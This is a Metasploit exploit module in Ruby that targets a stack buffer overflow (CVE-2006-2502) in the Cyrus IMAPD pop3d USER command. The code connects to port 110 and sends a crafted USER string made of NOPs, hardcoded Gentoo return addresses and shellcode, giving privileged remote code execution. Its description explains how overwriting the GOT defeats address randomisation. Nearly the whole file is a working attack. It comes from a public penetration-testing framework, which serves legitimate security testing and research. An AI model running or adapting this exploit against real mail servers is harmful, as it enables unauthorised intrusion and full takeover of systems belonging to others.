##
# $Id: cyrus_pop3d_popsubfolders.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Cyrus IMAPD pop3d popsubfolders USER Buffer Overflow',
			'Description'    => %q{
					This exploit takes advantage of a stack based overflow.  Once the stack
				corruption has occured it is possible to overwrite a pointer which is
				later used for a memcpy. This gives us a write anything anywhere condition
				similar to a format string vulnerability.

				NOTE: The popsubfolders option is a non-default setting.

				I chose to overwrite the GOT with my shellcode and return to it. This
				defeats the VA random patch and possibly other stack protection features.

				Tested on gentoo-sources Linux 2.6.16. Although Fedora CORE 5 ships with
				a version containing the vulnerable code, it is not exploitable due to the
				use of the FORTIFY_SOURCE compiler enhancement
			},
			'Author'         => [ 'bannedit', 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2006-2502' ],
					[ 'OSVDB', '25853' ],
					[ 'BID', '18056' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/2053' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/2185' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2006-05/0527.html' ],
				],
			'Payload'	=>
				{
					'Space'	=> 250,
					'DisableNops' => true,
				},
			'Platform'	=> 'linux',
			'Targets'	=>
				[
					# bannedit: 0x080fd204
					# K-sPecial: 0x8106c20 (debian 3.1 - 2.6.16-rc6)
					[ 'Gentoo 2006.0 Linux 2.6', { 'Ret' => 0x080fd318 } ],
				],
			'Privileged'		=> true,
			'DisclosureDate'	=> 'May 21 2006',
			'DefaultTarget'	=> 0))

		register_options( [ Opt::RPORT(110) ], self.class )
	end



	def exploit

		connect

		print_status "Banner: #{banner = sock.gets}"

		# NOTE: orig poc shellcode len: 84

		# kcope: 352+84+86+4 (nops,sc,nops,ret)
		# K-sPecial: 84+(120*4) (sc,addrs)
		# bannedit: 265+8+250+29+16
		shellcode = payload.encoded

		buf = "USER "
		buf << make_nops(265)
		# return address
		buf << [target.ret].pack('V') * 2
		buf << make_nops(250 - shellcode.length)
		buf << shellcode
		buf << make_nops(29)
		sc_addr = target.ret - 277
		buf << [sc_addr].pack('V') * 4
		buf << "\r\n"

		sock.send(buf, 0)
		disconnect

	end

end